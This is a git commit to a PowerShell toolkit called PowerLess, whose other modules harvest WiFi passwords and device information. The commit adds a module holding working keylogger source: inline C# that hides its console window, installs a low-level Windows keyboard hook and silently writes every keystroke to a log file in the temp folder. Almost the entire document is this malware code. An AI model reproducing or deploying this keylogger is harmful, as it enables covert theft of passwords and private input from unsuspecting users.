b7720fc055237ff6899126b4682d0f67678075f0
Dominik Tarnowski <dominik.t.uk@gmail.com>
2018-11-11 01:05:58 +0000

    Implement a `KeyLogger`

--- PowerLess.psm1
+++ PowerLess.psm1
@@ -2,3 +2,4 @@ Import-Module $PSScriptRoot\Modules\Get-WiFiPasswords.psm1
 Import-Module $PSScriptRoot\Modules\Get-DeviceInfo.psm1
 
 Import-Module $PSScriptRoot\Scripts\Extract.psm1
+Import-Module $PSScriptRoot\Scripts\KeyLogger.psm1
---
+++ Scripts/KeyLogger.psm1
@@ -0,0 +1,61 @@
+function KeyLogger() {
+  param(
+    [string]$Path = "$($Env:Temp)\log.txt"
+  )
+
+  Add-Type -TypeDefinition @"
+  using System;
+  using System.Diagnostics;
+  using System.IO;
+  using System.Runtime.InteropServices;
+  using System.Windows.Forms;
+
+  namespace KeyLogger {
+    public static class Program {
+      private const int WH_KEYBOARD_LL = 13;
+      private const int WM_KEYDOWN = 0x0100;
+      private const string logFileName = @"$Path";
+      private static StreamWriter logFile;
+      private static HookProc hookProc = HookCallback;
+      private static IntPtr hookId = IntPtr.Zero;
+      public static void Main () {
+        var handle = GetConsoleWindow();
+        ShowWindow(handle, 0);
+
+        logFile = File.AppendText (logFileName);
+        logFile.AutoFlush = true;
+        hookId = SetHook (hookProc);
+        Application.Run();
+        UnhookWindowsHookEx (hookId);
+      }
+      private static IntPtr SetHook (HookProc hookProc) {
+        IntPtr moduleHandle = GetModuleHandle (Process.GetCurrentProcess ().MainModule.ModuleName);
+        return SetWindowsHookEx (WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
+      }
+      private delegate IntPtr HookProc (int nCode, IntPtr wParam, IntPtr lParam);
+      private static IntPtr HookCallback (int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN) {
+          int vkCode = Marshal.ReadInt32 (lParam);
+          logFile.WriteLine ((Keys) vkCode);
+        }
+        return CallNextHookEx (hookId, nCode, wParam, lParam);
+      }
+
+      [DllImport ("user32.dll")]
+      private static extern IntPtr SetWindowsHookEx (int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+      [DllImport ("user32.dll")]
+      private static extern bool UnhookWindowsHookEx (IntPtr hhk);
+      [DllImport ("user32.dll")]
+      private static extern IntPtr CallNextHookEx (IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+      [DllImport ("kernel32.dll")]
+      private static extern IntPtr GetModuleHandle (string lpModuleName);
+      
+      [DllImport("kernel32.dll")]
+      static extern IntPtr GetConsoleWindow();
+      [DllImport("user32.dll")]
+      static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    }
+  }
+"@ -ReferencedAssemblies System.Windows.Forms
+  [KeyLogger.Program]::Main();
+}
